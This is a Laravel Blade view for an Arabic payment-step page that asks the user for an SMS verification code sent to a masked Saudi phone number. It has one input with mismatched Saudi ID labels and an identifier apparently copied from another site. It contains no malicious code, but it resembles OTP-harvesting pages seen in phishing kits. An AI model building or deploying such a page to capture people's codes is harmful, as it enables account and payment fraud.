@extends('frontend.layout.master')
@section('content')


<section class="payment-section m-5  section-padding">
    <div class="container">
        <div class="row  justify-center">




            
            <form class="payment-description p-5 w-75 ">
            
                <div class="text-center">
                    <h6 class="mb-5">ادخل رمز التحقيق المرسل الي جوالك برساله نصية</h6>
                    <h6>9665********</h6>
                </div>
              
              
               
                 <!--no3 el car -->
                 <div class="mt-3" id="input-Tasalsol">
                    
                    <input class="ta form-control input-of-buy" id="phid0" type="text"data-testid="homePhidControl" inputmode="numeric" autocomplete="off" name="id" title="" data-for="iqama_num" maxlength="10">
                  </div>
             
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button  class=" ta btn btn-secondary btn-sm mt-4 w-50  " >تأكيد</button>
                </div>
              
              </form>
        </div>
    </div>
</section>



@endsection
@section('custom-script')
    <script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
@endsection